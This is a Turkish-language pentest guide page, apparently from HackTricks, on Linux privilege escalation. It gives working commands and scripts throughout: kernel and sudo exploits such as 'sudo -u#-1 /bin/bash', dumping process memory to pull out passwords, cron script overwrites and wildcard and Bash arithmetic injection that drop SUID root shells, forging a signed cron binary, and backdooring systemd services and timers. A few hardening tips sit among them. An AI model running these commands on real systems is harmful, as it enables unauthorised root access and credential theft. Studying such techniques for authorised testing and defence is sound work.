# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan OS hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkeninin içindeki herhangi bir klasörde yazma izniniz varsa** bazı kütüphaneleri veya ikili dosyaları hijack edebilirsiniz:
```bash
echo $PATH
```
### Env bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını araştırın.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Burada iyi bir vulnerable kernel listesi ve bazı zaten **compiled exploits** bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O siteden tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits aramak için yardımcı olabilecek araçlar şunlardır:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victimde çalıştırın, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıdaki kaynaklarda görünen güvenlik açığı bulunan sudo sürümlerine göre:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün savunmasız olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo sürümlerinin 1.9.17p1'den önceki sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**) kullanıcı tarafından kontrol edilen bir dizinden `/etc/nsswitch.conf` dosyası kullanıldığında, sudo `--chroot` seçeneği aracılığıyla ayrıcalıksız yerel kullanıcıların root ayrıcalıklarına yükselmesine izin verir.

O [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)'ı exploit etmek için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) burada. Exploit'i çalıştırmadan önce, `sudo` sürümünüzün zafiyet içerip içermediğini ve `chroot` özelliğini destekleyip desteklemediğini kontrol edin.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) kaynağına bakın.

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu vuln'ün nasıl exploited edilebileceğine dair bir **örnek** için **smasher2 box of HTB**'e bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleyin

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, buradan kaçmayı deneyebilirsiniz:

{{#ref}}
docker-security/
{{#endref}}

## Diskler

Neyin **mounted and unmounted** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey unmounted ise, onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Kullanışlı ikili dosyaları listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını** kontrol edin. Bu, bazı kernel exploit'lerini kullanmanız gerekirse faydalıdır çünkü bunları kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zafiyetli Yazılım Yüklü

**Yüklü paketlerin ve servislerin sürümünü** kontrol edin. Belki eski bir Nagios sürümü (örneğin) vardır ve bu ayrıcalık yükseltmek için istismar edilebilir…\
Daha şüpheli görünen yüklü yazılımların sürümünü manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramayacak kadar çok bilgi göstereceğini unutmayın; bu yüzden OpenVAS veya benzeri, yüklü yazılım sürümlerinin bilinen exploits için zayıf olup olmadığını kontrol eden uygulamalar önerilir_

## İşlemler

Hangi **işlemlerin** çalıştırıldığını inceleyin ve herhangi bir işlemin olması gerekenden **daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin tomcat'in root tarafından çalıştırılması?).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

Process'leri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık çalıştırılan veya belirli gereksinimler karşılandığında yürütülen zafiyetli process'leri tespit etmek için çok faydalı olabilir.

### Process memory

Sunucunun bazı servisleri **kimlik bilgilerini belleğin içinde açık metin olarak** saklayabilir.\
Normalde diğer kullanıcılara ait process'lerin belleğini okumak için **root privileges** gerekir, bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha kullanışlıdır.\
Ancak unutmayın ki **bir normal kullanıcı olarak sahip olduğunuz process'lerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makine varsayılan olarak **ptrace'e izin vermez**, bu da yetkisiz kullanıcınıza ait diğer process'leri dump edemeyeceğiniz anlamına gelir.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tüm process'ler aynı uid'ye sahip olduğu sürece debug edilebilir. Bu, ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece bir parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: yalnızca admin ptrace kullanabilir, çünkü CAP_SYS_PTRACE capability gerektirir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir process ptrace ile izlenemez. Bir kez ayarlandığında, ptrace'i tekrar etkinleştirmek için reboot gerekir.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için, **maps, ilgili işlemin sanal adres alanında belleğin nasıl eşlendiğini gösterir**; ayrıca her eşlenmiş bölgenin **izinlerini** gösterir. **mem** pseudo file **işlemin belleğini doğrudan açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir olduğunu** ve bunların offsetlerini biliriz. Bu bilgiyi kullanarak **mem dosyasında arama yapıp tüm okunabilir bölgeleri dökeriz** bir dosyaya.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem ile erişilebilir.\
Genellikle, `/dev/mem` sadece **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. Şuradan edinebilirsiniz: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir sürecin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Kök gereksinimlerini manuel olarak kaldırabilir ve size ait olan süreci dökebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### Süreç Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator süreci çalışıyorsa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
İşlemi dump edebilir (bir işlemin belleğini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve bellekte kimlik bilgilerini arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Bu araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekten ve bazı **iyi bilinen dosyalardan** **açık metin kimlik bilgilerini çalar**. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | Süreç Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Aktif HTTP Basic Auth Oturumları)        | apache2              |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)   | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) root olarak çalışıyorsa – web tabanlı zamanlayıcı privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, SSH local port-forwarding ile yine de erişebilir ve ayrıcalıklı bir job oluşturarak yükseltme sağlayabilirsiniz.

Tipik zincir
- Sadece loopback'e açık portu (örn. 127.0.0.1:8000) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile keşfet
- Kimlik bilgilerini operasyonel artefaktlarda bul:
  - Yedekler/scriptler `zip -P <password>` ile
  - systemd unit'ı `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` ile ifşa ediyor
- Tünelle ve giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- High-priv job oluşturup hemen çalıştır (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Sertleştirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve minimum izinlerle sınırlandırın
- localhost'a bağlayın ve ayrıca erişimi firewall/VPN ile kısıtlayın; parolaları yeniden kullanmayın
- Gizli bilgileri unit dosyalarına gömmekten kaçının; secret stores veya yalnızca root için EnvironmentFile kullanın
- İstek üzerine çalışan job'lar için audit/logging'i etkinleştirin



Herhangi bir zamanlanmış job'ın zafiyeti olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlink kullanmak? root'un kullandığı dizine belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde şu PATH bulunur: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma ayrıcalığına sahip olduğunu unutmayın_)

Bu crontab içinde root kullanıcısı PATH'i ayarlamadan bir komut veya script çalıştırmaya çalışıyorsa. Örneğin: _\* \* \* \* root overwrite.sh_\
O zaman, şu şekilde root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Wildcard içeren bir script kullanan Cron (Wildcard Injection)

Eğer root tarafından çalıştırılan bir scriptin bir komutunda “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için suistimal edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard şu gibi bir yolun öncesinde ise** _**/some/path/\***_ **, zafiyetli değildir (hatta** _**./\***_ **de değildir).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içinde aritmetik değerlendirmeden önce parametre/değişken genişletme ve komut ikamesi yapar. Eğer root cron/parser, güvensiz log alanlarını okuyup bunları bir aritmetik bağlama veriyorsa, bir saldırgan cron çalıştığında root olarak çalışan bir komut ikamesi $(...) enjekte edebilir.

- Neden işe yarar: Bash'te genişletmeler şu sırayla gerçekleşir: parametre/değişken genişletme, komut ikamesi, aritmetik genişleme, ardından kelime bölme ve yol adı genişletmesi. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce ikame edilir (komut çalıştırılır), sonra geriye kalan sayısal `0` aritmetikte kullanılır ve script hatasız devam eder.

- Tipik zafiyet deseni:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parse edilen log'a saldırgan kontrollü metin yazdırın, böylece sayısal görünümlü alan bir komut ikamesi içerir ve bir rakamla biter. Komutunuzun stdout'a yazmamasını sağlayın (veya yönlendirin) ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan bir **cron scriptini değiştirebiliyorsanız**, çok kolay bir shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root tarafından çalıştırılan script tam erişime sahip olduğunuz bir **dizin** kullanıyorsa, o klasörü silip kontrolünüzdeki bir scripti çalıştıran başka bir dizine **symlink klasörü oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink doğrulaması ve daha güvenli dosya işlemleri

Yol ile dosya okuyan veya yazan ayrıcalıklı scripts/binaries incelerken, links'in nasıl işlendiğini doğrulayın:

- `stat()` bir symlink'i takip eder ve hedefin meta verilerini döndürür.
- `lstat()` link'in kendisine ait meta verilerini döndürür.
- `readlink -f` ve `namei -l` son hedefi çözmenize yardımcı olur ve her bir path bileşeninin izinlerini gösterir.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: yol zaten varsa hata verin (saldırganın önceden oluşturduğu link/dosyaları engeller).
- `openat()`: bir güvenilir dizin dosya tanımlayıcısına göre işlem yapın.
- `mkstemp()`: güvenli izinlerle geçici dosyaları atomik olarak oluşturun.

### Yazılabilir payload'lara sahip özel imzalı cron ikili dosyaları
Blue teams bazen cron-driven ikili dosyaları özel bir ELF bölümünü döküp vendor string için grep yaptıktan sonra root olarak çalıştırmadan "sign" ederler. Eğer bu ikili group-writable ise (ör., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) ve imzalama materyalini leak edebiliyorsanız, bölümü sahteleyip cron görevini ele geçirebilirsiniz:

1. Doğrulama akışını yakalamak için `pspy` kullanın. In Era, root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` çalıştırdı, ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` çalıştırdı ve sonra dosyayı yürüttü.
2. Beklenen sertifikayı leaked key/config (from `signing.zip`) kullanarak yeniden oluşturun:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Kötü amaçlı bir ikame oluşturun (ör., SUID bash bırakmak, SSH anahtarınızı eklemek) ve grep'in geçmesi için sertifikayı `.text_sig` içine gömün:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Yürütme bitlerini koruyarak planlanmış ikiliyi üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; basit imza kontrolü başarılı olduğunda payload'ınız root olarak çalışır.

### Sık çalışan cron görevleri

1, 2 veya 5 dakikada bir çalıştırılan süreçleri bulmak için süreçleri izleyebilirsiniz. Belki bundan faydalanıp ayrıcalıkları yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izlemek**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her işlemi izleyecek ve listeleyecektir).

### Saldırganın ayarladığı mode bits'leri koruyan root yedekleri (pg_basebackup)

Eğer root sahibi bir cron, yazabildiğiniz bir veritabanı dizinine karşı `pg_basebackup` (veya herhangi bir recursive copy) çalıştırıyorsa, yedek çıktısına aynı mode bits ile **root:root** sahibi olarak yeniden kopyalanacak bir **SUID/SGID binary** yerleştirebilirsiniz.

Tipik keşif akışı (düşük ayrıcalıklı bir DB kullanıcısı olarak):
- Her dakika `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` gibi bir komutu çağıran root cron'u tespit etmek için `pspy`'yi kullanın.
- Kaynak cluster'ın (ör. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve iş sonrası hedefin (`/opt/backups/current`) root tarafından sahiplenildiğini doğrulayın.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Bu, `pg_basebackup` klasör kümesini kopyalarken dosya mod bitlerini koruduğu için çalışır; root tarafından çağrıldığında hedef dosyalar **root sahipliği + saldırganın seçtiği SUID/SGID** miras alır. İzinleri koruyan ve yürütülebilir bir konuma yazan benzer herhangi bir ayrıcalıklı yedekleme/kopyalama rutini savunmasızdır.

### Görünmez cronjob'lar

Yorumdan sonra (yeni satır karakteri olmadan) bir carriage return koyarak bir cronjob oluşturmak mümkündür ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin, yazabiliyorsanız, onu **değiştirerek** hizmet **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor'unuzu çalıştıracak** şekilde ayarlayabilirsiniz (belki makinenin yeniden başlatılmasını beklemeniz gerekir).\
Örneğin .service dosyasının içine backdoor'unuzu **`ExecStart=/tmp/script.sh`** ile ekleyin

### Yazılabilir servis ikili dosyaları

Unutmayın ki eğer servisler tarafından çalıştırılan ikili dosyalar üzerinde **yazma izinleriniz** varsa, bunları backdoor yerleştirmek için değiştirebilirsiniz; böylece servisler yeniden çalıştırıldığında backdoor'lar da çalıştırılacaktır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **yazabiliyorsanız**, muhtemelen **escalate privileges** elde edebilirsiniz. Hizmet yapılandırma dosyalarında kullanılan **göreli yolları** aramanız gerekir, örneğin:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörü içinde **executable** ile **same name as the relative path binary** aynı adda bir dosya oluşturun; servis hassas eylemi gerçekleştirirken (**Start**, **Stop**, **Reload**) sizin **backdoor** çalıştırılacaktır (ayrıcalıksız kullanıcılar genellikle servisleri başlatıp/durduramaz — ancak `sudo -l` kullanıp kullanamadığınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service`'e bakın.**

## **Zamanlayıcılar**

**Zamanlayıcılar** systemd unit dosyalarıdır; isimleri `**.timer**` ile biter ve `**.service**` dosyalarını veya olayları kontrol eder. **Zamanlayıcılar** cron'a bir alternatif olarak kullanılabilir; takvim zamanı olaylarını (calendar time events) ve monotonic zaman olaylarını (monotonic time events) yerleşik olarak destekler ve eşzamansız (asynchronously) çalıştırılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Bir timer'ı değiştirebiliyorsanız, onu systemd.unit içindeki mevcut bazı birimleri (ör. `.service` veya `.target`) çalıştıracak şekilde ayarlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şu şekilde yazıyor:

> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman, son eki not ".timer" olan bir unit adıdır. Belirtilmemişse, bu değer son ek dışında timer unit ile aynı ada sahip bir service olarak varsayılan olur. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adının son ek dışında aynı şekilde adlandırılması önerilir.

Dolayısıyla, bu izni kötüye kullanmak için şunlara ihtiyacınız olur:

- **executing a writable binary** olan bir systemd unit (ör. `.service`) bulun
- **executing a relative path** olan bir systemd unit bulun ve **systemd PATH** üzerinde **writable privileges** sahibi olun (o executable'ı taklit etmek için)

**`man systemd.timer` ile timer'lar hakkında daha fazla bilgi edinin.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Soketler

Unix Domain Sockets (UDS), istemci-sunucu modelleri içinde aynı veya farklı makinelerde **proses iletişimine** olanak tanır. Bilgisayarlar arası iletişim için standart Unix tanımlayıcı dosyalarını kullanırlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Soketler `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında daha fazla bilgi için `man systemd.socket` komutuna bakın.** Bu dosyanın içinde, birkaç ilginç parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak özet olarak **soketin nerede dinleyeceğini belirtmek** için kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.).
- `Accept`: Boolean bir argüman alır. Eğer `true` ise, gelen her bağlantı için bir service unit başlatılır ve sadece bağlantı soketi ona geçirilir. Eğer `false` ise, tüm dinleme soketleri başlatılan service unit'e geçirilir ve tüm bağlantılar için yalnızca bir service unit başlatılır. Bu değer datagram soketleri ve FIFO'lar için yoksayılır; bu türlerde tek bir service unit koşulsuz olarak tüm gelen trafiği işler. Varsayılan `false`'tur. Performans nedenleriyle, yeni daemon'ların `Accept=no` ile uyumlu şekilde yazılması tavsiye edilir.
